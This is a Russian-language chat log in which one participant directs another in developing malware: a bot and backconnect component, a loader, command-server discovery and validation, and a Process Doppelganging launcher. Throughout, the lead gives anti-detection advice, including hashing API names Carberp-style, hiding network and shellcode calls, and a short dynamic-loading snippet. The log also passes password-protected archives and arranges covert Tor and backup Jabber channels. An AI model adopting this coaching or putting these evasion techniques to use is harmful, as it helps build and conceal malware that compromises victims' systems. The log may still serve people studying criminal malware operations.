Timestamp	From	To	Message
2020-10-21 06:36:39.760777	cany	kaktus	9qHbFT^9FNGBQ[Qfe4}*f*w
2020-10-21 06:36:39.952769	cany	kaktus	Download: https://qaz.im/load/sQSFny/EZeQNf
Delete: https://qaz.im/index.php?a=delete&q=1324875382
2020-10-22 18:29:50.475802	cany	kaktus	привет
2020-10-22 18:30:17.170695	kaktus	cany	привет
2020-10-22 18:30:35.046030	kaktus	cany	видел твой коммит последний
2020-10-22 18:30:49.104683	kaktus	cany	что-то с доппелем не выходит?
2020-10-22 18:31:01.062830	cany	kaktus	тогда еще не выходило
2020-10-22 18:31:06.622187	cany	kaktus	думал оставить пока
2020-10-22 18:31:13.877688	cany	kaktus	потому что уже приелось
2020-10-22 18:31:22.885482	cany	kaktus	буду сейчас возвращаться
2020-10-22 18:31:29.203315	kaktus	cany	а последний мой пример не помог?
2020-10-22 18:31:35.911080	kaktus	cany	это из моего БК, рабочий
2020-10-22 18:31:40.838369	cany	kaktus	еще не тестил
2020-10-22 18:31:47.319362	cany	kaktus	powershell скрипты почему не доходят до сервера
2020-10-22 18:32:00.745633	kaktus	cany	отложи допель - сделай сначала логирование, вывод инфы по каждой ошибке вызова функции
2020-10-22 18:32:15.490914	kaktus	cany	чтобы сразу видно было где ошибка и какой код у нее
2020-10-22 18:32:53.203129	kaktus	cany	по запуску powershell отчет в таком же формате, как и bat
2020-10-22 18:33:04.261106	kaktus	cany	если bat принимает ps тоже должен
2020-10-22 18:33:05.365375	cany	kaktus	ну да
2020-10-22 18:33:09.418078	cany	kaktus	я все аналогично делаю
2020-10-22 18:33:24.594125	kaktus	cany	опят таки - какая ошибка
2020-10-22 18:33:37.047156	kaktus	cany	код ответа на отчет какой
2020-10-22 18:35:34.825640	kaktus	cany	админка сейчас не работает
2020-10-22 18:36:18.053951	kaktus	cany	если вот эта ошибка [01:45:58] <asmwardest> Download: https://qaz.im/load/sQSFny/EZeQNf
2020-10-22 18:36:18.150939	cany	kaktus	пока тогда буду делать логирование
2020-10-22 18:36:42.740283	kaktus	cany	talar@ в этой жабе, он занимается бакэндом
2020-10-22 18:36:57.581529	kaktus	cany	я ему инфу передал, ничего не ответил пока
2020-10-22 18:37:17.826702	kaktus	cany	можешь к нему обращаться по багам админки
2020-10-22 18:37:22.616386	cany	kaktus	это просто в какой то момент вылетело, думал пригодиться разработчику
2020-10-22 18:38:23.051174	cany	kaktus	ты мне код кидал
2020-10-22 18:38:24.583280	cany	kaktus	log_library
2020-10-22 18:38:29.180696	cany	kaktus	этим логировать?
2020-10-22 18:39:22.483921	kaktus	cany	да, можно через нее
2020-10-22 18:39:59.435135	kaktus	cany	я же кидал тебе файлик 03. отладочное логирование.txt
2020-10-22 18:40:41.564153	kaktus	cany	не, я тебе в этом чате писал, смотри логи от 12.09
2020-10-22 18:42:15.736132	kaktus	cany	у тебя в последнем плане еще таких работ не было отмечено - валидация командного сервера, стратегия поиска командных серверов
2020-10-22 18:42:19.534861	kaktus	cany	про них не забудь
2020-10-22 18:42:32.276711	cany	kaktus	хорошо
2020-10-22 18:43:12.154551	kaktus	cany	и комменты добавь в код
2020-10-22 18:43:19.007385	kaktus	cany	хотябы по одной строчке на функцию)
2020-10-22 18:43:37.199412	cany	kaktus	понял
2020-10-22 18:48:09.701485	cany	kaktus	в console.h
2020-10-22 18:48:14.013281	cany	kaktus	такая зависимость
2020-10-22 18:48:14.755730	cany	kaktus	#include "..\config.h"
2020-10-22 18:48:19.209527	cany	kaktus	у меня нет файла
2020-10-22 18:49:03.764268	kaktus	cany	у тебя должен быть свой аналог config.h
2020-10-22 18:49:16.343938	kaktus	cany	это файл с настройками и надстройками сборки
2020-10-22 18:49:34.526589	cany	kaktus	а можно пример?
2020-10-22 19:00:46.293933	kaktus	cany	vn&ksg$NsjWk7sBvkwCn
2020-10-22 19:00:47.489821	kaktus	cany	Download: https://qaz.im/load/nFeBAS/K9Rs73
Delete: https://qaz.im/index.php?a=delete&q=1277919339
2020-10-22 19:04:53.581909	kaktus	cany	все основные параметры из этого файла ты также должен описать в README.txt проекта, и указать какие существенные значения для рабочей сборки (Release_Nologs)
2020-10-24 13:09:38.062362	cany	kaktus	привет
2020-10-24 13:09:45.329157	kaktus	cany	привет!
2020-10-24 13:09:46.028270	cany	kaktus	ip бк не менялся?
2020-10-24 13:11:49.060263	kaktus	cany	сейчас работы ведутся, сервак пока не работает
2020-10-24 13:12:00.844239	kaktus	cany	и не заработат раньше понедельника
2020-10-24 13:12:04.567680	kaktus	cany	как появится - отпишусь
2020-10-24 13:34:32.295890	cany	kaktus	хорошо
2020-10-24 13:34:38.896273	cany	kaktus	у меня с логированием
2020-10-24 13:34:48.613146	cany	kaktus	не все заголовочные файлы
2020-10-24 13:34:58.224527	cany	kaktus	одни тянут за собой другие
2020-10-24 13:37:13.583297	kaktus	cany	какие?
2020-10-24 13:38:01.204950	cany	kaktus	console.cpp -> GetApi.h
2020-10-24 13:38:28.766209	cany	kaktus	getapi.h -> obfuscation.h
2020-10-24 13:38:36.683616	cany	kaktus	последнего у меня нет
2020-10-24 13:38:45.872191	cany	kaktus	такая зависимость должна быть?
2020-10-24 13:39:01.776734	cany	kaktus	или от нее можно избавиться?
2020-10-24 13:39:59.539576	kaktus	cany	а каких определений не хватаате?
2020-10-24 13:40:16.941403	kaktus	cany	вообще логирование не обязательно обфусцировать
2020-10-24 13:40:40.929142	kaktus	cany	попробуй отвязать console.cpp от GetApi
2020-10-24 13:41:38.886692	cany	kaktus	тогда нет указателей на следуюзие функции
2020-10-24 13:41:42.438986	cany	kaktus	pLeaveCriticalSection
2020-10-24 13:41:45.047238	cany	kaktus	pHeapFree
2020-10-24 13:41:49.869585	cany	kaktus	pCreateFileA
2020-10-24 13:42:10.030786	cany	kaktus	не понимаю почему они через указатели вызываются
2020-10-24 13:42:25.749017	cany	kaktus	вроде не проблема
2020-10-24 13:42:38.674893	cany	kaktus	они ведь в windows.h есть
2020-10-24 13:43:18.887252	kaktus	cany	с префиксом p - это макрысы из GetApi
2020-10-24 13:43:41.291389	kaktus	cany	убери p, оставь прямые вызовы LeaveCriticalSection HeapFree и тд
2020-10-24 13:44:01.523054	cany	kaktus	и получится тоже самое только без обфускации?
2020-10-24 13:44:02.188064	kaktus	cany	у тебя GetApi.h  есть?
2020-10-24 13:44:08.630608	cany	kaktus	есть
2020-10-24 13:44:12.545903	kaktus	cany	и GetApi.cpp
2020-10-24 13:44:16.811901	cany	kaktus	да
2020-10-24 13:44:39.708332	kaktus	cany	GetApi - это пример обфускации системных вызовов
2020-10-24 13:45:28.705327	kaktus	cany	тебе надо обфусцировать вызовы в основном коде, в рабочей сборке
2020-10-24 13:46:06.907460	kaktus	cany	желательно все, но в первую очередь подозрительные - работа с сетью, запуски модулей, шеллкода
2020-10-24 13:48:21.473307	kaktus	cany	обфусцировать их можно на основе поиска имени функций по хешам, без вызова GetProcAddress() - пример такого подхода в модулях GetApi, который был изучен и описан из трояна Carberp
2020-10-24 13:48:47.395576	kaktus	cany	можешь взять за основу GetApi и подгонять под себя, можешь другой какой метод использовать
2020-10-24 13:48:52.887044	cany	kaktus	да, эти пояснения у меня есть
2020-10-24 13:48:53.742491	cany	kaktus	понял
2020-10-24 13:49:19.390140	kaktus	cany	суть в том что в бинарнике модуля не должны быть открытые текстовые строки с именами функций
2020-10-24 13:50:06.422861	kaktus	cany	а отладочный лог - он для внутреннего пользования подразумевается, там полная обфускация не обязательна
2020-10-24 14:02:32.040584	cany	kaktus	писать в файл или в крнсоль?
2020-10-24 14:04:20.938389	kaktus	cany	в версии Release_logged должно писаться в файл обязательно. В консоль можно выводить дополнительно для удобства
2020-10-26 10:45:27.584989	kaktus	cany	гитом не пользуйся пока - переезд. 
когда штатно заработает - напишу отдельно
2020-10-26 11:11:58.770806	kaktus	cany	и еще - напиши свой резервный контакт в другой жабе, на случай если эта будет недоступна. Если резерва нет - то заведи аккаунт на exploit.im или другом сервере.
2020-10-26 11:12:01.116542	kaktus	cany	Мой резервный аккаунт на случай потери связи: dpigeon@exploit.im
2020-10-26 18:59:52.013544	kaktus	cany	гитом не пользуйся пока - переезд. 
когда штатно заработает - напишу отдельно
2020-10-26 18:59:52.085971	kaktus	cany	и еще - напиши свой резервный контакт в другой жабе, на случай если эта будет недоступна. Если резерва нет - то заведи аккаунт на exploit.im или другом сервере.
2020-10-26 18:59:52.086793	kaktus	cany	Мой резервный аккаунт на случай потери связи: dpigeon@exploit.im
2020-10-27 14:52:23.162640	cany	kaktus	привет
2020-10-27 14:54:53.359753	cany	kaktus	можешь подробнее про exploit.im  рассказать
2020-10-28 17:53:05.317920	cany	kaktus	привет
2020-10-28 17:53:31.639435	kaktus	cany	привет!
2020-10-28 17:56:11.921572	cany	kaktus	бк и репозиторий все еще не работают?
2020-10-28 17:56:39.454036	kaktus	cany	да, никак не поднимут
2020-10-28 17:57:05.491929	cany	kaktus	а про exploit.im  можешь рассказать?
2020-10-28 17:57:07.941192	kaktus	cany	пока работай над тем функционалом, который не касается обмена с сервером
2020-10-28 17:58:09.364110	kaktus	cany	жаббер-сервер, типа этого. Только тот не через тор
2020-10-28 17:58:21.972188	kaktus	cany	тебе надо завести резервный аккаунт на любом жабер-сервере, exploit.im привожу в пример т.к. его часто используют
2020-11-02 13:53:02.097746	kaktus	cany	[16:52:19] <kaktus> [16:37:00] <defender> другим кого знаешь, у кого есть рез жабы, пусть мне стукнут [16:37:19] <defender> сегодня будем раздавать акки новой жабы 
[16:52:22] <kaktus> polanders@exploit.im 
[16:52:29] <kaktus> это дефендер, добавься к нему в резервной жабе. Дальше связь на резервном акке пока не будет новой жабы
2020-11-02 18:19:34.988385	kaktus	cany	[16:52:19] <kaktus> [16:37:00] <defender> другим кого знаешь, у кого есть рез жабы, пусть мне стукнут [16:37:19] <defender> сегодня будем раздавать акки новой жабы 
[16:52:22] <kaktus> polanders@exploit.im 
[16:52:29] <kaktus> это дефендер, добавься к нему в резервной жабе. Дальше связь на резервном акке пока не будет новой жабы
2020-11-03 16:54:33.880385	cany	kaktus	rkN&:;M+UWNw;mqVE5JBT
2020-11-03 16:54:36.247944	cany	kaktus	Download: https://qaz.im/load/Qyet4y/8ynHbe
Delete: https://qaz.im/index.php?a=delete&q=2032113916
2020-11-03 16:57:04.535583	kaktus	cany	принял
2020-11-03 17:04:00.069063	kaktus	cany	проект не полный, нет файла солюшна
2020-11-03 17:04:05.683262	kaktus	cany	от предыдущей версии не подходит
2020-11-03 17:05:21.497779	kaktus	cany	та подошел
2020-11-03 17:09:43.467482	kaktus	cany	жду план-отчет по проекту
2020-11-03 17:09:44.621307	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-03 17:09:49.770432	kaktus	cany	нужен срочно!
2020-11-03 17:17:46.543153	cany	kaktus	принял
2020-11-03 17:17:46.629992	cany	kaktus	проект не полный, нет файла солюшна
2020-11-03 17:17:46.630332	cany	kaktus	от предыдущей версии не подходит
2020-11-03 17:17:46.702397	cany	kaktus	та подошел
2020-11-03 17:17:46.706220	cany	kaktus	жду план-отчет по проекту
2020-11-03 17:17:46.708778	cany	kaktus	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-03 17:17:46.709637	cany	kaktus	нужен срочно!
2020-11-05 07:25:59.283054	kaktus	cany	жду план-отчет по проекту
2020-11-05 07:26:01.270899	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-05 07:26:06.983854	kaktus	cany	нужен срочно!
2020-11-05 18:02:48.073108	kaktus	cany	жду план-отчет по проекту
2020-11-05 18:02:48.230320	kaktus	cany	[12:25:18] <kaktus> 2. напиши кратко текущее состояние проекта в следующем формате: какой функционал осталось реализовать и сколько времени на это нужно (план), отметь, какой функционал еще не до конца изучен или по какому есть вопросы/сложности
2020-11-05 18:02:48.231018	kaktus	cany	нужен срочно!
2020-11-05 18:03:02.834309	cany	kaktus	понял
2020-11-05 18:03:09.493229	cany	kaktus	сейчас напишу
2020-11-05 18:08:51.921015	cany	kaktus	1. Валидация сервера
2. Сброс текущей команды (1 день)
3. Обфускация (3 дня)
4. Техника запуска exe (допель, 2 дня)
2020-11-05 18:11:28.855953	kaktus	cany	модуль лоадера не начинал еще делать?
2020-11-05 18:16:35.294883	kaktus	cany	по боту большое отклонение в сроках по сравнению с предыдущим планом - с двух недель до месяца. Почему так?
2020-11-05 18:17:51.745964	cany	kaktus	еще не начинал
2020-11-05 18:18:55.461152	cany	kaktus	в первые столкнулся с техниками реализации функционала
2020-11-05 18:19:15.726577	cany	kaktus	поэтому не расчитал
2020-11-05 18:19:33.049231	cany	kaktus	с выполнением скриптов например
2020-11-05 18:19:48.543668	cany	kaktus	оказались трудности с пайпами
2020-11-05 18:19:50.481438	kaktus	cany	доппель последний вариант так не заработал, лог не проясняет что с ним не так?
2020-11-05 18:20:00.410024	cany	kaktus	которые я не мог заранее предвидеть
2020-11-05 18:20:39.012873	cany	kaktus	у меня ошибка при создании параметров среды окружения
2020-11-05 18:20:45.301697	cany	kaktus	но код продолжает выполняться
2020-11-05 18:20:58.027025	cany	kaktus	а потом падает на старте потока
2020-11-05 18:21:22.417978	kaktus	cany	[21:19:48] <asmwardest> оказались трудности с пайпами - что не получается?
2020-11-05 18:21:25.116850	kaktus	cany	или уже решил
2020-11-05 18:21:35.254399	cany	kaktus	да это уже все решил
2020-11-05 18:23:16.822594	cany	kaktus	сейчас чтобы сброс команды текущей сделать нужен бк
2020-11-05 18:25:38.814885	kaktus	cany	так прийми файл
2020-11-05 18:25:40.206473	kaktus	cany	b7dNx#bAn7dCvsn%gAbx
2020-11-05 18:25:43.466118	kaktus	cany	Download: https://qaz.im/load/GYeG4t/NTBseE
Delete: https://qaz.im/index.php?a=delete&q=1636675062
2020-11-05 18:25:50.061010	kaktus	cany	твоя задача немного меняется теперь
2020-11-05 18:26:07.230632	kaktus	cany	тот же проект с небольшими дополнениями, но нужно ускориться
2020-11-05 18:26:53.025590	kaktus	cany	тебе нужно как можно быстрее выйти на рабочую версию БК и реализовать все в соответствии с ТЗ и файлом "дополнение к ТЗ БК бета.txt" который в этом архиве
2020-11-05 18:27:18.358522	kaktus	cany	поэтому даю тебе готовые исходники лоадера рабочего
2020-11-05 18:27:31.745551	kaktus	cany	целиком
2020-11-05 18:27:49.069795	kaktus	cany	и по БД куски кода для нового функционала - телеметрия и дополнение отчета по команде getsysinfo
2020-11-05 18:28:17.276232	kaktus	cany	если какого-то кода не хватит - напиши об этом, выдам дополнительно
2020-11-05 18:29:33.516931	kaktus	cany	алгоритмом доппеля пока не занимайся
2020-11-05 18:29:53.924048	kaktus	cany	максимум пару часов на него еще, если не заработает - откладывай и ставь заглушку
2020-11-05 18:30:29.789767	kaktus	cany	поиск командных серверов и валидация есть в лоадере, адаптируй оттуда код для бота
2020-11-05 18:31:06.028895	kaktus	cany	лоадер можешь собирать как есть, можешь под себя код адаптировать постепенно. Сейчас задача собрать как можно быстрее все
2020-11-05 18:31:47.907547	kaktus	cany	но в итоге тебе код надо будет хорошо понимать свой, т.к. в дальнейшем будешь его варьировать, менять дополнять
2020-11-05 18:32:02.956545	kaktus	cany	с учетом этого определись как сделать оптимальнее будет
2020-11-05 18:35:40.892712	kaktus	cany	подтверди, что принял файл и информацию
2020-11-05 18:36:14.324348	cany	kaktus	да, я все получил
2020-11-05 18:36:19.870675	kaktus	cany	ок
2020-11-05 18:39:01.805097	kaktus	cany	сервер БК все еще не готов, процесс это тормозит конечно увы..
2020-11-05 18:44:18.267508	kaktus	cany	вообщем изучай код и задачу, прикидывай как сделать оптимальнее все
2020-11-05 18:44:59.592366	kaktus	cany	через пару дней жду от тебя план работ и оценку времени по выходу на рабочую бета-версию БК
2020-11-05 19:04:05.327189	cany	kaktus	хорошо
2020-11-08 13:15:15.063953	kaktus	cany	привет!
2020-11-11 19:48:50.626381	kaktus	cany	тест
2020-11-11 19:49:13.891159	cany	kaktus	тест
2020-11-11 20:00:52.571564	cany	kaktus	пришло?
2020-11-11 20:01:17.224522	kaktus	cany	нет(
2020-11-11 20:02:37.975538	kaktus	cany	еще раз направь без OTR, чтото глючит дико
2020-11-11 20:06:02.690454	cany	kaktus	нет(
2020-11-11 20:06:02.853089	cany	kaktus	еще раз направь без OTR, чтото глючит дико
2020-11-11 20:13:02.949759	cany	kaktus	План: 
[01:17:04] <asmwardest> 1. Обфускация (1 день)
2. Таймауты и повторные соединения с сервером (1 день)
3. Верификация, телеметрия (1 день)
4. Перепроверить всю работу с взаимодействием с сервером (оставшиеся недочеты)(2 дня)

К 16 числу бд должен быть готов
2020-11-11 20:18:49.778683	kaktus	cany	+
2020-11-11 20:19:07.342260	kaktus	cany	все упирается в сервер - он до сих пор не работает
2020-11-11 20:21:03.377059	cany	kaktus	это да
2020-11-11 20:21:36.882688	cany	kaktus	мне нужно отправлять на сервер сообщения об ошибке (не GetLastError)
2020-11-11 20:21:44.295607	cany	kaktus	?
2020-11-11 20:21:59.825191	cany	kaktus	точнее нет
2020-11-11 20:22:04.725445	cany	kaktus	их в том числе
2020-11-11 20:22:28.760588	kaktus	cany	не обязательно
2020-11-11 20:23:16.472478	kaktus	cany	для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed"
2020-11-11 20:24:47.671933	kaktus	cany	можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:25:22.316936	cany	kaktus	для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed"
2020-11-11 20:25:22.465062	cany	kaktus	можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:27:27.780914	kaktus	cany	[23:23:16] <kaktus> для команд запуска модулей - в случае ошибки достаточно отправлять "Result=failed" 
[23:24:47] <kaktus> можно чуть детализировать по типу ошибки "module download error", "incorrect executable file format", "module running error"
2020-11-11 20:27:31.745584	kaktus	cany	в команде закачки файла: "file not found", "file read error"
2020-11-12 17:58:29.315336	cany	kaktus	привет
2020-11-12 18:00:00.695955	kaktus	cany	привет
2020-11-12 18:00:31.771934	cany	kaktus	что делать, если в getapi.h нет некоторых функций?
2020-11-12 18:02:34.724080	kaktus	cany	добавь макросы соответствующие, хеш-функция есть можно посчитать
2020-11-12 18:02:56.857827	kaktus	cany	или загружать динамически их
2020-11-12 18:03:56.694574	kaktus	cany	Системные вызовы либо обфусцируются GetApi.h, 
либо, если в GetApi нужный вызов отсутствует или не работает (бывает),
следующим способом:

HANDLE h = pLoadLibrary(_STR("dll_name.dll"));
void* f = pGetProcAddress(h, _STR("func_name"));
2020-11-12 18:04:25.409601	kaktus	cany	[19.09.2020 20:13:42] <kaktus> второй способ - более правильный - добавить соответствующий макрос pushargEx для нужной функции
[19.09.2020 20:14:46] <kaktus> то есть надо сгенерировать хеш для нужных функций и вписать его вторым аргументом
[19.09.2020 20:15:10] <kaktus> функция вычисления хеш в GetApi.cpp есть
[19.09.2020 20:15:40] <kaktus> в идеале - отдельным скриптом перестроить весь массив макросов
2020-11-12 18:04:32.803980	cany	kaktus	понял
2020-11-12 18:08:29.318890	kaktus	cany	hvNv5ns&snCksgBs
2020-11-12 18:08:30.206510	kaktus	cany	Download: https://qaz.im/load/ZzaYDE/hD4NHH
Delete: https://qaz.im/index.php?a=delete&q=1524149832
2020-11-12 18:09:46.938956	kaktus	cany	мой сырой вариант такого скрипта
2020-11-12 18:10:08.355325	kaktus	cany	 [19.09.2020 20:27:03] <kaktus> входной GetApi.h
[19.09.2020 20:27:30] <kaktus> возможно из него надо что-то вырезать чтобы корректно сработало, точно не помню
[19.09.2020 20:28:08] <kaktus> ну и этот скрипт был под какойто один вариант ГетАпи задочен, а они разные есть
[19.09.2020 20:28:28] <kaktus> не факт что сходу к твоей подойдет
[19.09.2020 20:29:12] <kaktus> смысл там такой: считываются строки, ищутся вида #define p****
[19.09.2020 20:29:52] <kaktus> из каждой выделяем имя функции, пускаем на хеш-функцию из GetApi.cpp и результат дописываем в макрос
[19.09.2020 20:30:50] <kaktus> третий параметр -это сквозной счетчик-нумератор, он используется в общей таблице хешей
2020-11-12 18:12:18.751869	kaktus	cany	тебе учетку в новом чате не выдали еще?
2020-11-12 18:12:24.951150	cany	kaktus	нет
2020-11-12 18:13:34.003442	kaktus	cany	стукни поландерсу еще раз, он сам может долго не вспомнить
2020-11-12 18:14:02.322392	kaktus	cany	надо в новый переходить, рас здесь глючит все. Без шифрования тут вообще переписку вести не рекомендуют
2020-11-12 18:15:12.005312	cany	kaktus	он не принял заявку
2020-11-12 18:15:37.197810	cany	kaktus	polanders@exploit.im
2020-11-12 18:20:10.199119	kaktus	cany	написал ему, ждем
2020-11-12 18:39:36.290823	kaktus	cany	https://qaz.im/zaq/SKhsFb7N#RTQ9kkbY
2020-11-12 18:51:03.964359	cany	kaktus	а что это?
2020-11-12 18:51:18.070202	kaktus	cany	новый чат
2020-11-12 18:51:32.518616	kaktus	cany	через браузер и тор
2020-11-12 18:52:01.260710	kaktus	cany	пароль одноразовый при входе придумывай новый
2020-11-12 19:07:03.701081	cany	kaktus	мне тебя там добавить надо?
2020-11-12 19:09:38.793524	kaktus	cany	написал тебе там, появилось?
2020-11-16 17:18:50.572022	cany	kaktus	привет
2020-11-16 17:38:31.590878	kaktus	cany	привет, я тебе в новом рабочем чате инфу скинул. Прими там и подтверди
